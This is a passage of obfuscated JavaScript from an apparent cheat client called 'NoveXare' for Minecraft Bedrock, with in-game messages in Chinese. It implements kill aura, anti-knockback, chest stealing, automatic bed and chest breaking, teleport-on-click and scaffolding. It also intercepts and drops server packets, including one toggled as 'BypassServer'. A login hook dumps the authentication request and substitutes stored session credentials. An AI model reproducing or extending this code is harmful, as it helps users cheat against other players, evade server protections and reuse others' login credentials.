    if (func_mode.pyrpc_mode === 1) {
      _0x277ab6 = _0x3e3a97;
    }
    if (func_mode.pyrpc_mode === 2) {
      _0x277ab6 = HexToFormat(_0x3e3a97);
    }
    const _0x3b850a = JSON.parse(readFile(getResource() + "/NoveXare/PyRpc_Config.json"));
    for (let _0x198ce7 of _0x3b850a) {
      if (typeof _0x198ce7 == "object") {
        if (_0x198ce7.match_mode == 0 && _0x277ab6.includes(_0x198ce7.packet)) {
          _0x277ab6 = remarks;
        }
        if (_0x198ce7.match_mode == 1 && _0x277ab6.includes == _0x198ce7.packet) {
          _0x277ab6 = remarks;
        }
      } else {
        continue;
      }
    }
    let _0x41533b = _0x371bb3 ? `
§3§l已拦截该PyRpc数据包
§r§e==============================` : "\n§r§e==============================";
    if (packet_tip && PyRpcManager && !_0x171bfa && (show_no_intercept && !_0x371bb3 || show_intercept && _0x371bb3)) {
      clientMessage("§3§l[NoveXare]§r§7 >>> §rPyRpc - §aSend§7 >>> §r \n" + (show_pyrpc_id ? "ID: " + _0x37e8ed + "\n" : "") + _0x277ab6 + _0x41533b);
    }
    return _0x371bb3;
  }
}
globalThis.onEntityBehaviorEvent = function (_0x47b309, _0x9ef0dc, _0x543b11) {
  if (ShowEntityAnime) {
    clientMessage("§3§l[NoveXare]§r§7 >>> §rTIP §7>>> §r实体ID:" + _0x47b309 + " 实体昵称:" + getEntityName(_0x47b309) + " 行为ID:" + _0x9ef0dc + " 行为数据:" + _0x543b11);
  }
  if (_0x9ef0dc == 39 && _0x47b309 == Arrow_id) {
    Arrow_id = null;
  }
  if (_0x9ef0dc == 3 && attack_list.includes(_0x47b309)) {
    if (KillMessage) {
      sendChatMessage(text);
    }
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Killed A Target §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0x47b309));
    }
    kills++;
    mini_tick = 0;
    if (FunnyKill && mini_kills < 10) {
      mini_kills++;
    }
    thread(() => {
      if (FunnyKill && mini_kills > 0) {
        loadSound(kill_sound[mini_kills > 6 ? 5 : mini_kills - 1], mini_close * 1000);
      }
      if (FunnyKill && mini_kills > 0 && mini_title) {
        setTitle(kill_tip[mini_kills - 1]);
      }
    }, mini_delay * 1000);
  }
  if (_0x9ef0dc == 2 && AvoidInvalid) {
    AttackSwing = attack_list.includes(_0x47b309);
  }
  if (_0x9ef0dc == 2 && attack_list.includes(_0x47b309)) {
    real_attack++;
  }
  if (_0x9ef0dc == 2 && _0x47b309 == self_id) {
    if (ActivitySender) {
      sendChatMessage("我正在被攻击");
    }
    if (ShowHurt) {
      clientMessage("§3§l[NoveXare]§r§7 >>> §cWarning §7>>> §r您正在受伤 受伤类型:" + _0x543b11);
    }
    if (HurtJump) {
      playerJump();
    }
    if (AntiKB) {
      const _0x2fc77d = getEntityMotion(self_id);
      const _0x5913b3 = AntiKB_resistance_h / 100;
      const _0x213744 = AntiKB_resistance_v / 100;
      setMotion(_0x2fc77d.x - _0x5913b3 * _0x2fc77d.x, _0x2fc77d.y - _0x213744 * _0x2fc77d.y, _0x2fc77d.z - _0x5913b3 * _0x2fc77d.z);
    }
  }
  if (_0x9ef0dc == 2) {
    attack_list = [];
  }
};
globalThis.onPlayerDestroyBlockEvent = function (_0x4864ac, _0x55ddae, _0xe55d13, _0xef2fd0, _0x5d3009) {
  const _0x4d3fc8 = getCarried(_0x4864ac);
  const _0x39e55e = getEntityPos(_0x4864ac);
  const _0x5aee5a = getBlock(_0x55ddae, _0xe55d13, _0xef2fd0);
  if (_0x5aee5a.namespace != "minecraft:air") {
    if (ShowDestroyBlock) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + (" 命名空间:" + _0x5aee5a.namespace + ", §rID:" + _0x5aee5a.id + ", §r特殊值:" + _0x5aee5a.aux + "\n手持:" + _0x4d3fc8.name + "-[" + _0x4d3fc8.namespace + "], ID:" + _0x4d3fc8.id + ", 特殊值:" + _0x4d3fc8.aux + "\n坐标:[" + _0x55ddae + ", " + _0xe55d13 + ", " + _0xef2fd0 + "]"));
    }
    if (ActivitySender) {
      sendChatMessage("我正在破坏" + _0x55ddae + " " + _0xe55d13 + " " + _0xef2fd0 + "的" + _0x5aee5a.namespace);
    }
    if (Miner && (_0x5aee5a.namespace == destroy_namespace || !isDestroy)) {
      if (!isDestroy && current_mine_num < mine_num) {
        isDestroy = true;
        destroy_namespace = _0x5aee5a.namespace;
      }
      if (isDestroy && destroy_namespace != _0x5aee5a.namespace && current_mine_num < mine_num && destroy_list.length > 0) {
        destroy_namespace = _0x5aee5a.namespace;
      }
      var _0x3fb547 = {
        x: _0x55ddae,
        y: _0xe55d13,
        z: _0xef2fd0
      };
      if (getDistance(_0x39e55e, _0x3fb547) <= mine_distance && isDestroy) {
        let _0x38052a = [[_0x55ddae + 1, _0xe55d13, _0xef2fd0], [_0x55ddae - 1, _0xe55d13, _0xef2fd0], [_0x55ddae, _0xe55d13, _0xef2fd0 + 1], [_0x55ddae, _0xe55d13, _0xef2fd0 - 1], [_0x55ddae, _0xe55d13 + 1, _0xef2fd0], [_0x55ddae, _0xe55d13 - 1, _0xef2fd0]];
        for (p of _0x38052a) {
          const _0x4ab0af = getBlock(p[0], p[1], p[2]);
          if (_0x4ab0af.namespace != "minecraft:air" && _0x5aee5a.namespace == destroy_namespace) {
            destroy_list.push(p);
          }
        }
      }
    }
  }
};
function onReadyEvent() {
  if (KillAura_auto_close && KillAura) {
    KillAura = false;
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r§c Auto Disable KillAura!");
    }
  }
  if (ShowGameInfo) {
    const _0x228455 = getWorldData();
    if (ShowGameInfo) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + (" 进入世界 " + _0x228455.levelName + " ，难度:" + _0x228455.difficulty + " 游戏模式:" + _0x228455.gameType + " 游戏时间:" + _0x228455.time + " 随机刻速度:" + _0x228455.randomTickSpeed));
    }
  }
}
globalThis.onPlayerBuildBlockEvent = function (_0x17c4e6, _0x2ef718, _0x28a934, _0x4307d9, _0x493733) {
  if (PVPDaLao) {
    setTitle("又或是建筑大佬");
  }
  const _0x1bdfe3 = getCarried(_0x17c4e6);
  const _0x469dae = getBlock(_0x2ef718, _0x28a934, _0x4307d9);
  if (ActivitySender) {
    sendChatMessage("我正在放置" + _0x1bdfe3.name);
  }
  if (ShowClickBlock) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + (" 命名空间:" + _0x469dae.namespace + ", §rID:" + _0x469dae.id + ", §r特殊值:" + _0x469dae.aux + "\n手持:" + _0x1bdfe3.name + "-[" + _0x1bdfe3.namespace + "], ID:" + _0x1bdfe3.id + ", 特殊值:" + _0x1bdfe3.aux + "\n坐标:[" + _0x2ef718 + ", " + _0x28a934 + ", " + _0x4307d9 + "]"));
  }
  if (ClickTP) {
    MenuTP(_0x2ef718, _0x28a934 + 1, _0x4307d9);
  }
  if (ResShop && resList.includes(_0x1bdfe3.namespace)) {
    const _0x435743 = getEntityList();
    for (id of _0x435743) {
      if (getEntityTypeId(id) === 16777999 || getEntityTypeId(id) === 16778099) {
        attack(id, AttackSwing);
        break;
      }
    }
  }
  if (GetCommand && _0x469dae.namespace.includes("command_block")) {
    let _0x4f520b = getBlockEntityNBT(_0x2ef718, _0x28a934, _0x4307d9);
    let _0x503ee8 = getText(_0x4f520b, "Command:\"", "\",Cu");
    let _0x4eb87f = getText(_0x4f520b, "auto:", "b,c") == "1" ? "是" : "否";
    let _0x4e59cb = getText(_0x4f520b, "TickDelay:", ",Tr");
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("坐标:[" + _0x2ef718 + " " + _0x28a934 + " " + _0x4307d9 + "] 指令:" + _0x503ee8 + " 是否自动:" + _0x4eb87f + " 执行延迟:" + _0x4e59cb));
    return true;
  }
  if (FakeBuilder) {
    let _0x8bbca2 = [[_0x2ef718, _0x28a934 - 1, _0x4307d9], [_0x2ef718, _0x28a934 + 1, _0x4307d9], [_0x2ef718, _0x28a934, _0x4307d9 - 1], [_0x2ef718, _0x28a934, _0x4307d9 + 1], [_0x2ef718 - 1, _0x28a934, _0x4307d9], [_0x2ef718 + 1, _0x28a934, _0x4307d9]];
    setBlock(_0x8bbca2[_0x493733][0], _0x8bbca2[_0x493733][1], _0x8bbca2[_0x493733][2], _0x1bdfe3.namespace, _0x1bdfe3.aux);
    return true;
  }
  if (ClickBlock) {
    setBlock(_0x2ef718, _0x28a934, _0x4307d9, _0x1bdfe3.namespace, _0x1bdfe3.aux);
    return true;
  }
  if ((Cleaner || SmartInv) && _0x469dae.namespace == "minecraft:chest") {
    isOpenChest = true;
  }
  if (ChestSteal && _0x469dae.namespace == "minecraft:chest") {
    isOpenChest = true;
    setTimeout(() => callModule(47, "{\"auto_close\":true,\"value\":true}"), steal_delay * 1000);
    setTimeout(() => {
      callModule(47, "{\"auto_close\":false,\"value\":false}");
      isOpenChest = false;
    }, (steal_delay + 0.05) * 1000);
  }
  var _0x4664e2 = {
    x: _0x2ef718,
    y: _0x28a934,
    z: _0x4307d9
  };
  if (ClickDestroy && !AutoDestroy) {
    ModuleDestroy(_0x4664e2);
  }
  if (auto_bed && _0x469dae.namespace == "minecraft:bed" && !isBedbuild) {
    if (_0x1bdfe3.namespace == "minecraft:air") {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>§r 请手持方块");
    }
    let _0x205e73 = [[_0x2ef718 + 1, _0x28a934, _0x4307d9], [_0x2ef718 - 1, _0x28a934, _0x4307d9], [_0x2ef718, _0x28a934, _0x4307d9 + 1], [_0x2ef718, _0x28a934, _0x4307d9 - 1], [_0x2ef718, _0x28a934 + 1, _0x4307d9]];
    isBedbuild = true;
    for (let _0x574dd9 of _0x205e73) {
      const _0x516d23 = getBlock(_0x574dd9[0], _0x574dd9[1], _0x574dd9[2]);
      if (_0x516d23.namespace == "minecraft:air") {
        Click(_0x574dd9[0], _0x574dd9[1], _0x574dd9[2]);
      }
    }
    isBedbuild = false;
  }
  if (BlockIn && !isBlockin) {
    if (temp_pos.x == _0x2ef718 && temp_pos.y == _0x28a934 && temp_pos.z == _0x4307d9) {
      isBlockin = true;
      let _0x354a5a = getPlayerBlockPos(self_id);
      let _0x20775b = [[_0x354a5a.x, _0x354a5a.y - 1, _0x354a5a.z], [_0x354a5a.x, _0x354a5a.y + 2, _0x354a5a.z], [_0x354a5a.x + 1, _0x354a5a.y, _0x354a5a.z], [_0x354a5a.x - 1, _0x354a5a.y, _0x354a5a.z], [_0x354a5a.x, _0x354a5a.y, _0x354a5a.z + 1], [_0x354a5a.x, _0x354a5a.y, _0x354a5a.z - 1], [_0x354a5a.x + 1, _0x354a5a.y + 1, _0x354a5a.z], [_0x354a5a.x - 1, _0x354a5a.y + 1, _0x354a5a.z], [_0x354a5a.x, _0x354a5a.y + 1, _0x354a5a.z + 1], [_0x354a5a.x, _0x354a5a.y + 1, _0x354a5a.z - 1]];
      for (pos of _0x20775b) {
        let _0x5c20ad = getBlock(pos[0], pos[1], pos[2]);
        if (_0x5c20ad.namespace == "minecraft:air") {
          Click(pos[0], pos[1], pos[2]);
        }
      }
      temp_pos = {
        x: 0,
        y: 0,
        z: 0
      };
      isBlockin = false;
      return true;
    }
    if (temp_pos.x != _0x2ef718 || temp_pos.y != _0x28a934 || temp_pos.z != _0x4307d9) {
      temp_pos = {
        x: _0x2ef718,
        y: _0x28a934,
        z: _0x4307d9
      };
    }
  }
  if (Breaker && (_0x1bdfe3.namespace.includes("sword") || _0x1bdfe3.namespace.includes("pickaxe"))) {
    const _0x400a5e = Math.round(breaker_range);
    _0x184c0a: for (let _0x312cce = -_0x400a5e; _0x312cce <= _0x400a5e; _0x312cce++) {
      for (let _0x151a6f = -_0x400a5e; _0x151a6f < _0x400a5e; _0x151a6f++) {
        for (let _0x4deccd = -_0x400a5e; _0x4deccd <= _0x400a5e; _0x4deccd++) {
          let _0x241da7 = _0x2ef718 + _0x312cce;
          let _0x191779 = _0x28a934 + _0x151a6f;
          let _0x1ff445 = _0x4307d9 + _0x4deccd;
          let _0x54e3c8 = getBlock(_0x241da7, _0x191779, _0x1ff445);
          if (break_bed && _0x54e3c8.namespace == "minecraft:bed" || break_chest && _0x54e3c8.namespace == "minecraft:chest") {
            let _0x3fb7a7 = getBlock(_0x241da7, _0x191779 + 1, _0x1ff445);
            if (_0x3fb7a7.namespace != "minecraft:air" && destroy_up) {
              _0x191779 += 1;
            }
            if (breaker_auto && _0x3fb7a7.namespace == "minecraft:end_stone") {
              selectPlayerInventorySlot(self_id, getItem(self_id, "_pickaxe"));
            }
            if (breaker_auto && _0x3fb7a7.namespace == "minecraft:planks") {
              selectPlayerInventorySlot(self_id, getItem(self_id, "_axe"));
            }
            destroyBlock(self_id, _0x241da7, _0x191779, _0x1ff445, 0);
            destroyPacket(_0x241da7, _0x191779, _0x1ff445, destroy_authinput, destroy_playeraction);
            break _0x184c0a;
          }
        }
      }
    }
  }
  if (block_ac_select && BlockClicker) {
    var _0x2c1e8e = {
      x: _0x2ef718,
      y: _0x28a934,
      z: _0x4307d9
    };
    ac_pos.push(_0x2c1e8e);
    clientMessage("§3§l[NoveXare]§r§7 >>> §rTip §7>>> §r" + ("已添加[" + _0x2ef718 + ", " + _0x28a934 + ", " + _0x4307d9 + "]"));
    return true;
  }
  if (FastBuild && build_list.length === 0 && build_success) {
    const _0xa4ccf2 = getCameraRotation();
    var _0x413d51 = {
      pitch: 0,
      yaw: _0xa4ccf2.yaw
    };
    for (let _0x52946f = 0; _0x52946f < build_distance + 1; _0x52946f++) {
      build_list.push(getDisplacement(_0x52946f, getPlayerBlockPos(self_id), _0x413d51));
    }
    build_success = false;
    return true;
  }
  if (AntiTouch && (_0x469dae.namespace == "minecraft:chest" || _0x469dae.namespace == "minecraft:ender_chest")) {
    return true;
  }
};
function onKeyboardDownEvent(_0x39ce25) {
  if (ShowPressKey) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 按下键值 " + _0x39ce25);
  }
  if (key_bind_list.length > 0 && key_bind_list[_0x39ce25] != undefined) {
    callFunc(key_bind_list[_0x39ce25], !globalThis[key_bind_list[_0x39ce25]]);
  }
  if (isBinding != null && _0x39ce25 != 66) {
    key_bind_list[_0x39ce25] = isBinding;
    NoveXare_Config.key_binds = key_bind_list;
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 绑定 " + isBinding + " 与键值 " + _0x39ce25);
    isBinding = null;
  }
}
function onKeyboardUpEvent(_0x724248) {
  if (ShowUpliftKey) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 释放键值 " + _0x724248);
  }
}
const PacketCfg = JSON.parse(readFile(NoveXare_path + "/PacketManager.json"));
function onSendServerPacketEvent(_0x2a3c77, _0xb7fa70) {
  if (Scaffold && Scaffold_HasSelected && _0x2a3c77 == 31) {
    Scaffold_HasReceived = true;
    return true;
  }
  if (ShowSendPacket) {
    var _0x13b7f7 = {
      id: _0x2a3c77,
      count: 1
    };
    if (statisticsSendPacket) {
      packetlist.send[_0xb7fa70] = packetlist.send[_0xb7fa70] == undefined ? _0x13b7f7 : {
        id: _0x2a3c77,
        count: packetlist.send[_0xb7fa70].count + 1
      };
    }
    const _0x372241 = PacketCfg.send;
    const {
      ignore,
      intercept
    } = PacketCfg.send;
    var _0x45883d = [];
    if (showSendID) {
      _0x45883d.push(_0x2a3c77);
    }
    if (showSendName) {
      _0x45883d.push(_0xb7fa70);
    }
    let _0x5a4028 = interceptSendPacket && (intercept.includes(_0x2a3c77) || intercept.includes(_0xb7fa70));
    if (!ignoreSendPacket || !ignore.includes(_0x2a3c77) && !ignore.includes(_0xb7fa70)) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 发送数据包: " + _0x45883d.join(" - ") + (_0x5a4028 ? "\n已拦截数据包" : ""));
    }
    return _0x5a4028;
  }
}
function onReceiveServerPacketEvent(_0x593a5c, _0x2ade4f) {
  if (BypassServer && _0x593a5c == 18) {
    return true;
  }
  if (NoCamShake && _0x593a5c == 27) {
    return true;
  }
  if (ShowReceivePacket) {
    var _0x6ca391 = {
      id: _0x593a5c,
      count: 1
    };
    if (statisticsReceivePacket) {
      packetlist.receive[_0x2ade4f] = packetlist.receive[_0x2ade4f] == undefined ? _0x6ca391 : {
        id: _0x593a5c,
        count: packetlist.receive[_0x2ade4f].count + 1
      };
    }
    const _0x5e2e0e = PacketCfg.receive;
    const {
      ignore,
      intercept
    } = PacketCfg.receive;
    var _0x425425 = [];
    if (showReceiveID) {
      _0x425425.push(_0x593a5c);
    }
    if (showReceiveName) {
      _0x425425.push(_0x2ade4f);
    }
    let _0x41f6d7 = interceptReceivePacket && (intercept.includes(_0x593a5c) || intercept.includes(_0x2ade4f));
    if (!ignoreReceivePacket || !ignore.includes(_0x593a5c) && !ignore.includes(_0x2ade4f)) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 接收数据包: " + _0x425425.join(" - ") + (_0x41f6d7 ? "\n已拦截数据包" : ""));
    }
    return _0x41f6d7;
  }
}
function onTouchMotionDownEvent(_0x15e3ac, _0x511889, _0x4d09ee) {
  if (SafeAttack && target_list.length > 0 && isAimed(self_id, target_list[0], SafeAttack_fov, 0)) {
    attack(target_list[0], AttackSwing);
  }
}
function onPlayerAuthInputEvent(_0x16c99d) {
  if (PlayerAuthInputPacket) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + ("玩家授权输入:\n视角:[仰俯角:" + _0x16c99d.rot.pitch.toFixed(2) + ", 偏航角:" + _0x16c99d.rot.yaw.toFixed(2) + "],\n坐标[" + _0x16c99d.pos.x.toFixed(2) + ", " + _0x16c99d.pos.y.toFixed(2) + "," + _0x16c99d.pos.z.toFixed(2) + "],\n移动值:[" + _0x16c99d.delta.x.toFixed(2) + ", " + _0x16c99d.delta.y.toFixed(2) + ", " + _0x16c99d.delta.z.toFixed(2) + "],\n预测移动值:[左右:" + _0x16c99d.analogMove.x.toFixed(2) + ", 上下:" + _0x16c99d.analogMove.y.toFixed(2) + "], 实际移动值:[左右:" + _0x16c99d.moveVec.x.toFixed(2) + ", 上下:" + _0x16c99d.moveVec.y.toFixed(2) + "],\n操作标识组:" + _0x16c99d.flags));
  }
}
function onSAuthLoginRequestEvent(_0x2ad3c3) {
  if (DumpRequestSauth) {
    write_file(NoveXare_path + "/SauthRequest.json", _0x2ad3c3);
    showToast("已导出请求体");
  }
  if (Sauths != null && Sauths != "") {
    if (record_sauth) {
      setData("sauths", Sauths);
    }
    var _0x438178 = Sauths.replace(/\\"/g, "\"").replace("\"{", "{").replace("\"}\"}", "\"}}").replace(/\\\\"/g, "转义").replace("}}\"}", "}\"}}");
    const _0x1feec5 = _0x2ad3c3.replace(getText(_0x2ad3c3, "\"sauth_json\":", ",\"seed"), JSON.stringify(JSON.parse(_0x438178).sauth_json));
    showToast("已拦截替换sauth");
    return _0x1feec5.replace(/转义/g, "\\\"");
  }
}
function onSAuthLoginResponseEvent(_0xdfe3db) {
  if (DumpResponseSauth && fun.SauthLogin != "") {
    write_file(NoveXare_path + "/SauthResponse.json", _0xdfe3db);
    showToast("已导出响应体");
  }
}
const default_config = readFile(config_path + "/" + getData("default_config", "null") + ".json");
if (default_config != "{}") {
  let list = JSON.parse(default_config);
  let num = 0;
  bind_func = list.binds;
  key_bind_list = list.key_binds;
  RunAway_binds = list.RunAway_binds;
  for (let key in list) {
    num++;
    if (key.includes("_mode")) {
      func_mode[key] = list[key];
    }
    if (key != "binds") {
      globalThis[key] = list[key];
    }
  }
  clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "自动加载配置成功，共" + num + "条配置");
}
clientMessage("§3§l[NoveXare] §r§7>>>§r §aNoveXare 加载成功!");
clientMessage("§3§l[NoveXare] §r§7>>>§r UI §7>>>§r 您当前使用的UI是: " + current_ui.name);